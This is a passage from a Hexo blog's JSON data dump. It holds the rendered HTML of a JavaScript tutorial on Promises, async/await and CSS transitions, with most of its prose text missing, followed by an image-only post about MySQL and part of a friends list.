punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">500</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h3 id=\"Promise\"><a href=\"#Promise\" class=\"headerlink\" title=\"Promise\"></a>Promise</h3><blockquote>\n<p>Promise </p>\n</blockquote>\n<p>Promise </p>\n<h4 id=\"then-x2F-catch-\"><a href=\"#then-x2F-catch-\" class=\"headerlink\" title=\"then&#x2F;catch \"></a>then&#x2F;catch </h4><p>JavaCompletableFuture</p>\n<p>CompletableFuture</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token comment\">//</span>\n    <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">if</span> <span class=\"token operator\">==</span><span class=\"token boolean\">true</span><span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">else</span> <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n     console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n     <span class=\"token keyword\">return</span> data\n     <span class=\"token comment\">//dataresolve</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n     console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>error<span class=\"token punctuation\">)</span>\n     <span class=\"token comment\">//errorreject</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token keyword\">return</span> data \n   <span class=\"token comment\">//</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token comment\">//</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n   console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n   <span class=\"token comment\">//undefined</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">error</span><span class=\"token punctuation\">)</span><span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n    console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"all-x2F-race-\"><a href=\"#all-x2F-race-\" class=\"headerlink\" title=\"all&#x2F;race \"></a>all&#x2F;race </h4><ul>\n<li><p>all </p>\n<blockquote>\n<p>Promiseall</p>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">let</span> Promise1 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">let</span> Promise2 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">let</span> Promise3 <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">let</span> p <span class=\"token operator\">=</span> Promise<span class=\"token punctuation\">.</span><span class=\"token function\">all</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>Promise1<span class=\"token punctuation\">,</span> Promise2<span class=\"token punctuation\">,</span> Promise3<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span>\n\np<span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token function\">funciton</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">//   </span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token comment\">//  </span>\n<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n</li>\n<li><p>race </p>\n<p><em><strong></strong></em></p>\n<blockquote>\n<p>racepromisepromise</p>\n</blockquote>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">//</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">requestImg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token keyword\">var</span> img <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Image</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           img<span class=\"token punctuation\">.</span><span class=\"token function-variable function\">onload</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">function</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n               <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>img<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span>\n           img<span class=\"token punctuation\">.</span>src <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n   <span class=\"token comment\">//</span>\n   <span class=\"token keyword\">function</span> <span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n       <span class=\"token keyword\">var</span> p <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n           <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n               <span class=\"token function\">reject</span><span class=\"token punctuation\">(</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n           <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5000</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n       <span class=\"token keyword\">return</span> p<span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n   Promise<span class=\"token punctuation\">.</span><span class=\"token function\">race</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token function\">requestImg</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token function\">timeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">then</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">data</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span><span class=\"token punctuation\">&#123;</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">catch</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">err</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n       console<span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>err<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li>\n</ul>\n<h3 id=\"async-x2F-await\"><a href=\"#async-x2F-await\" class=\"headerlink\" title=\"async&#x2F;await\"></a>async&#x2F;await</h3><p>promise</p>\n<blockquote>\n<p>asyncasyncawait</p>\n<p>kotlinsuspend   Deffered#await</p>\n<p>js</p>\n</blockquote>\n<p><strong></strong></p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token comment\">// awaitpromiseasync</span>\n<span class=\"token keyword\">const</span> <span class=\"token function-variable function\">step</span> <span class=\"token operator\">=</span> <span class=\"token punctuation\">(</span><span class=\"token parameter\">size<span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">,</span> ele</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve<span class=\"token punctuation\">,</span> reject</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n            ele<span class=\"token punctuation\">.</span>style<span class=\"token punctuation\">.</span>marginLeft <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token interpolation\"><span class=\"token interpolation-punctuation punctuation\">$&#123;</span>size<span class=\"token interpolation-punctuation punctuation\">&#125;</span></span><span class=\"token string\">px</span><span class=\"token template-punctuation string\">`</span></span>\n            <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">,</span> time<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// awaitstep</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">id</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">const</span> ele <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">getElementById</span><span class=\"token punctuation\">(</span>id<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;=</span> <span class=\"token number\">200</span><span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">await</span> <span class=\"token function\">step</span><span class=\"token punctuation\">(</span>i <span class=\"token operator\">+</span> <span class=\"token number\">100</span><span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">,</span> ele<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token comment\">// </span>\n<span class=\"token comment\">// </span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">awaitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"one\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"two\"</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">asyncAnimation</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"three\"</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token function\">awaitAll</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h4 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h4><h5 id=\"top-await\"><a href=\"#top-await\" class=\"headerlink\" title=\"top await\"></a>top await</h5><p></p>\n<blockquote>\n<p>type&#x3D;module </p>\n<p>JSJS top await await  async </p>\n<p> </p>\n</blockquote>\n<pre class=\"line-numbers language-markup\" data-language=\"markup\"><code class=\"language-markup\"><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;</span>script</span> <span class=\"token attr-name\">src</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>optimize/script.js<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">type</span><span class=\"token attr-value\"><span class=\"token punctuation attr-equals\">=</span><span class=\"token punctuation\">\"</span>module<span class=\"token punctuation\">\"</span></span> <span class=\"token attr-name\">defer</span><span class=\"token punctuation\">></span></span><span class=\"token script\"></span><span class=\"token tag\"><span class=\"token tag\"><span class=\"token punctuation\">&lt;/</span>script</span><span class=\"token punctuation\">></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n\n<p>await</p>\n<p>code</p>\n<pre class=\"line-numbers language-javascript\" data-language=\"javascript\"><code class=\"language-javascript\"><span class=\"token keyword\">const</span> p <span class=\"token operator\">=</span> document<span class=\"token punctuation\">.</span><span class=\"token function\">querySelector</span><span class=\"token punctuation\">(</span><span class=\"token string\">'p'</span><span class=\"token punctuation\">)</span>\n<span class=\"token keyword\">const</span> content <span class=\"token operator\">=</span> <span class=\"token template-string\"><span class=\"token template-punctuation string\">`</span><span class=\"token string\">\n\n\n</span><span class=\"token template-punctuation string\">`</span></span>\n\n<span class=\"token comment\">// JavaThread.sleep</span>\n<span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">ms</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">return</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Promise</span><span class=\"token punctuation\">(</span><span class=\"token parameter\">resolve</span> <span class=\"token operator\">=></span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token function\">setTimeout</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">=></span> <span class=\"token function\">resolve</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> ms<span class=\"token punctuation\">)</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> content<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n    p<span class=\"token punctuation\">.</span>textContent <span class=\"token operator\">=</span> content<span class=\"token punctuation\">.</span><span class=\"token function\">substring</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">await</span> <span class=\"token function\">sleep</span><span class=\"token punctuation\">(</span><span class=\"token number\">200</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p></p>\n<h5 id=\"css\"><a href=\"#css\" class=\"headerlink\" title=\"css\"></a>css</h5><pre class=\"line-numbers language-css\" data-language=\"css\"><code class=\"language-css\"><span class=\"token selector\">.circle</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">width</span><span class=\"token punctuation\">:</span> 100px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">height</span><span class=\"token punctuation\">:</span> 100px<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">border-radius</span><span class=\"token punctuation\">:</span> 100%<span class=\"token punctuation\">;</span>\n    <span class=\"token property\">transition</span><span class=\"token punctuation\">:</span> all 1s<span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token selector\">.circle.at-end</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token property\">transform</span><span class=\"token punctuation\">:</span> <span class=\"token function\">translateX</span><span class=\"token punctuation\">(</span>200px<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>transition: all 1s; 1s</p>\n"},{"title":"SQL","date":"2021-07-22T15:14:42.000Z","author":"","hide":false,"summary":"MySQL","_content":"\n## \n\n**/**\n****\n\n****\n\n[![7e8c1fed3737e6ab](https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png)](https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png)\n\n****\n\n[![-2bf7c04dec497124](https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg)](https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg)\n\n[![-3e6ca3264d9d5b3a](https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg)](https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg)\n\n[![54e384ac658f35d9](https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg)](https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg)\n\n****\n[![1c4ec094fffaaa6a](https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png)](https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png)\n[![-1edc645b674852e1](https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png)](https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png)\n[![-5462c585fd3183db](https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png)](https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png)","source":"_posts/be-careful-using-mysql.md","raw":"---\ntitle: SQL\ndate: 2021-07-22 23:14:42\nauthor: \nhide: false\nsummary: MySQL\ncategories: \ntags:\n  - MySQL\n---\n\n## \n\n**/**\n****\n\n****\n\n[![7e8c1fed3737e6ab](https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png)](https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png)\n\n****\n\n[![-2bf7c04dec497124](https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg)](https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg)\n\n[![-3e6ca3264d9d5b3a](https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg)](https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg)\n\n[![54e384ac658f35d9](https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg)](https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg)\n\n****\n[![1c4ec094fffaaa6a](https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png)](https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png)\n[![-1edc645b674852e1](https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png)](https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png)\n[![-5462c585fd3183db](https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png)](https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png)","slug":"be-careful-using-mysql","published":1,"updated":"2021-11-13T16:16:48.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clbx23jt4000bsfkl6j730i2d","content":"<h2 id=\"\"><a href=\"#\" class=\"headerlink\" title=\"\"></a></h2><p><strong>/</strong><br><strong></strong><br><br><strong></strong></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663341-3692ff72-388d-4dea-a216-4021943b5437.png\" alt=\"7e8c1fed3737e6ab\"></a></p>\n<p><strong></strong></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663530-030ca6e0-e7eb-456c-88d0-3ea803a609c0.jpg\" alt=\"-2bf7c04dec497124\"></a></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663547-64e62179-46ca-4696-9fa6-044f57c804f7.jpg\" alt=\"-3e6ca3264d9d5b3a\"></a></p>\n<p><a href=\"https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg\"><img src=\"https://user-images.githubusercontent.com/69996135/126663565-d42a10e9-b5fd-42d6-bb34-edc6aef0d993.jpg\" alt=\"54e384ac658f35d9\"></a></p>\n<p><strong></strong><br><a href=\"https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663612-d738f9d0-ea64-4a05-bc5d-eb6d5917c496.png\" alt=\"1c4ec094fffaaa6a\"></a><br><a href=\"https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663622-aea138f4-716b-4186-9ce1-7e531b8e57ce.png\" alt=\"-1edc645b674852e1\"></a><br><a href=\"https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png\"><img src=\"https://user-images.githubusercontent.com/69996135/126663631-0c50a072-f1c2-4fc9-9d39-887138cb3048.png\" alt=\"-5462c585fd3183db\"></a></p>\n","site":{"data":{"friends":[{"avatar":"https://avatars.githubusercontent.com/u/59405399?v=4","name":"iGxnon","introduction":"Keep Learning...","url":"https://blog.skygard.cn/","title":""},{"avatar":"https://avatars.githubusercontent.com/u/46246823?v=4","name":"StellarisW","introduction":"Devops in 